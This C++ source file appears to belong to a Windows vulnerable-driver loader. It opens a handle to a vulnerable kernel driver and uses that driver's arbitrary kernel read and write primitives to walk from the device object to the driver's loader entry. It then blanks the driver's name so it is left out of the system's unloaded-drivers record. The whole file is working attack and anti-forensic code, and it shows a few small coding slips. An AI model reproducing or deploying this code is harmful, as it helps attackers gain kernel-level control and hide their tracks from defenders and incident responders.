#include "vuln_driver.h"

#include "ntops.h"

using namespace kernel;


void PrintErrorCode(int errorMsg, char* buf, int bufferSize)
{
	FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL, GetLastError(), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
		buf, (bufferSize / sizeof(wchar_t)), NULL);

}

vulnerable_driver::vulnerable_driver(const std::string& device_name)
{
	driver_handle = CreateFile(device_name.c_str(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (driver_handle== INVALID_HANDLE_VALUE)
	{
		char buf[256];
		int errorCode = GetLastError();
		PrintErrorCode(errorCode, buf, sizeof(buf));
		printf("UNABLE TO OPEN HANDLE TO VULNERABLE DRIVER: 0x%.8x %s\n", errorCode, buf);
	}
}

bool vulnerable_driver::remove_from_unloaded_drivers()
{
	ULONG handle_info_size = 0x10000;
	PSYSTEM_HANDLE_INFORMATION handle_info = handle_info = (PSYSTEM_HANDLE_INFORMATION)VirtualAlloc(nullptr, handle_info_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	NTSTATUS status = 0;
	do
	{
		status = NtQuerySystemInformation(
			SystemExtendedHandleInformation,
			handle_info,
			handle_info_size,
			&handle_info_size
		);
		if (status == STATUS_INFO_LENGTH_MISMATCH)
		{
			VirtualFree(handle_info, 0, MEM_RELEASE);
			handle_info_size *= 2;
			handle_info = (PSYSTEM_HANDLE_INFORMATION)VirtualAlloc(handle_info, handle_info_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
		}
	} while (status == STATUS_INFO_LENGTH_MISMATCH);

	if (!NT_SUCCESS(status))
	{
		VirtualFree(handle_info, 0, MEM_RELEASE);
		return false;
	}

	ULONG currentPID = GetCurrentProcessId();

	uint64_t object = 0ULL;
	for (size_t i = 0u; i < handle_info->HandleCount; ++i)
	{
		const SYSTEM_HANDLE system_handle = handle_info->Handles[i];

		if (system_handle.UniqueProcessId != reinterpret_cast<HANDLE>(currentPID))
			continue;

		if (system_handle.HandleValue == driver_handle)
		{
			object = reinterpret_cast<uint64_t>(system_handle.Object);
			break;
		}
	}

	VirtualFree(handle_info, 0, MEM_RELEASE);

	if (object == 0ULL)
		return false;

	uint64_t device_object = 0ull;

	if (!driver_read_primitive(object + 0x8, &device_object, sizeof(device_object)))
		return false;

	uint64_t driver_object = 0;

	if (!driver_read_primitive(device_object + 0x8, &driver_object, sizeof(driver_object)))
		return false;

	uint64_t driver_section = 0;

	if (!driver_read_primitive(driver_object + 0x28, &driver_section, sizeof(driver_section)))
		return false;

	UNICODE_STRING us_driver_base_dll_name = { 0 };

	if (!driver_read_primitive(driver_section + 0x58, &us_driver_base_dll_name, sizeof(us_driver_base_dll_name)))
		return false;

	us_driver_base_dll_name.Length = 0;

	if (!driver_write_primitive(driver_section + 0x58, &us_driver_base_dll_name, sizeof(us_driver_base_dll_name)))
		return false;

	return true;
}
